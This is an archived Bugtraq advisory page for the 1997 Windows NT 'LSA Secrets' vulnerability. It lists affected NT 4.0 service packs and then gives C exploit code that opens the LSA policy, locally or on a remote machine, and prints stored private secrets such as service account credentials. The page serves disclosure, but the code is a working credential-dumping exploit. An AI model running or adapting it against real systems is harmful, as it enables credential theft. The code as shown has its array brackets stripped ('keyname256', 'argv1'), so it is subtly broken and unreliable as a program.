#SpeeDr00t@Black Falcon<br>#bid231<p><b><span style="font-size: 18pt;">NT LSA Secrets Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/231/info">info</a><br><a href="http://www.securityfocus.com/bid/231/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/231/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/231/solution">solution</a><br><a href="http://www.securityfocus.com/bid/231/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				231
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jul 16 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 16 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Paul Ashton &lt;paul@ARGO.DEMON.CO.UK&gt; posted this vulnerability to NTBugtraq on July 16, 1997.  He posted the exploit code to NTBugtraq on August 9, 1997.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows NT  4.0 SP3<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP3<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP2<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP2<br/>
</span>
					
				
					Microsoft Windows NT  4.0 SP1<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP1<br/>
</span>
					
				
					Microsoft Windows NT  4.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows NT  4.0 SP4<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Enterprise Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Terminal Server  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows NT Workstation  4.0 SP4<br/>
</span>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	Must be run with administrative privileges<br/><br/>run as: prog _sc_schedule machine, prog nl$1, prog w3_root_data<br/>or any other registry key under NTLM\security\policy\secrets.<br/><br/>&lt;---begin---&gt;<br/>#include &lt;windows.h&gt;<br/>#include &lt;stdio.h&gt;<br/><br/>#include "ntsecapi.h"<br/>#define AST(x) if (!(x)) {printf("Failed line %d\n", __LINE__);exit(1);} else<br/>void write();<br/><br/>PLSA_UNICODE_STRING<br/>str(LPWSTR x)<br/>{<br/>    static LSA_UNICODE_STRING s;<br/><br/>    s.Buffer=x;<br/>    s.Length=wcslen(x)*sizeof(WCHAR);<br/>    s.MaximumLength = (wcslen(x)+1)*2;<br/>    return &amp;s;<br/>}<br/><br/>int _cdecl<br/>main(int argc, char *argv)<br/>{<br/>    LSA_HANDLE pol;<br/>    PLSA_UNICODE_STRING foo;<br/>    LSA_OBJECT_ATTRIBUTES attrs;<br/>    WCHAR keyname256=L"";<br/>    WCHAR host256=L"";<br/><br/>    wsprintfW(keyname, L"%hS", argv1);<br/>    if(argc == 3) wsprintfW(host, L"%hS", argv2);<br/>    memset(&amp;attrs, 0, sizeof(attrs));<br/>    AST(!LsaOpenPolicy(str(host), &amp;attrs, 0, &amp;pol));<br/>    AST(!LsaRetrievePrivateData(pol, str(keyname), &amp;foo));<br/>    write(1, foo-&gt;Buffer, foo-&gt;Length);<br/>    LsaClose(pol);<br/>    exit(0);<br/>}<br/>&lt;---end---&gt;
	
		<ul>
</ul>
</div>